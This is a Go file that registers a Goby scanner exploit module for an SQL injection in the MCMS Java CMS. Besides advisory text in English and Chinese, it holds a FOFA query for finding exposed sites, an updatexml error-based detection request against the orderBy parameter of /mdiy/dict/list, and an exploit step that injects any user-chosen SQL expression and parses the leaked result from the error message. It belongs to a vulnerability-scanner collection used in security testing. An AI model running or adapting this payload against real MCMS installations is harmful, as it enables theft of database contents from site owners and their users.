package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "MCMS SQL injection vulnerability",
    "Description": "<p>MCMS is a full open source Java CMS!Based on SpringBoot 2 architecture, the front-end is based on VUE and Element UI.</p><p>SQL injection vulnerability exists in MCMS, through which attackers can obtain database sensitive information.</p>",
    "Product": "MCMS",
    "Homepage": "https://gitee.com/mingSoft/MCMS",
    "DisclosureDate": "2022-07-24",
    "Author": "橘先生",
    "FofaQuery": "body=\"/static/plugins/ms/1.0.0/ms.js\"",
    "GobyQuery": "body=\"/static/plugins/ms/1.0.0/ms.js\"",
    "Level": "2",
    "Impact": "<p>SQL injection vulnerability exists in MCMS, through which attackers can obtain database sensitive information.</p>",
    "Recommendation": "<p>At present, the manufacturer has not issued any repair measures to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's home page or reference website for solutions at any time:https://gitee.com/mingSoft/MCMS</p><p></p><p><a href=\"https://pandorafms.com/\"></a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20md5(233)),0x7e),1)",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b4",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20{{{sql}}}),0x7e),1)",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: '~(.*?)~'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "MCMS SQL注入漏洞",
            "Product": "MCMS",
            "Description": "<p><span style=\"color: rgba(0, 0, 0, 0.65);\"></span><span style=\"color: rgb(204, 0, 0);\"></span>MCMS是一个<span style=\"color: rgb(64, 72, 91);\">完整开源的Java CMS！基于SpringBoot 2架构，前端基于vue、element ui。</span><br></p><p><span style=\"color: rgba(0, 0, 0, 0.65);\"><span style=\"color: rgb(22, 28, 37);\">MCMS</span>&nbsp;存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息等。<br></span></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法:</p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><a href=\"https://gitee.com/mingSoft/MCMS\" rel=\"nofollow\">https://gitee.com/mingSoft/MCMS</a></span><br></p><p><a href=\"http://www.kfgjp.cn/\"></a><br></p><p><a target=\"_Blank\" href=\"https://pandorafms.com/\"></a></p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(22, 28, 37);\">MCMS</span><span style=\"color: rgba(0, 0, 0, 0.65); font-size: 16px;\">&nbsp;存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息等。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "MCMS SQL injection vulnerability",
            "Product": "MCMS",
            "Description": "<p style=\"text-align: justify;\">MCMS is a full open source Java CMS!Based on SpringBoot 2 architecture, the front-end is based on VUE and Element UI.</p><p style=\"text-align: justify;\">SQL injection vulnerability exists in MCMS, through which attackers can obtain database sensitive information.</p>",
            "Recommendation": "<p style=\"text-align: justify;\">At present, the manufacturer has not issued any repair measures to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's home page or reference website for solutions at any time:<span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><a href=\"https://gitee.com/mingSoft/MCMS\" rel=\"nofollow\">https://gitee.com/mingSoft/MCMS</a></span></p><p style=\"text-align: justify;\"></p><p style=\"text-align: justify;\"><a href=\"https://pandorafms.com/\"></a></p>",
            "Impact": "<p>SQL injection vulnerability exists in MCMS, through which attackers can obtain database sensitive information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}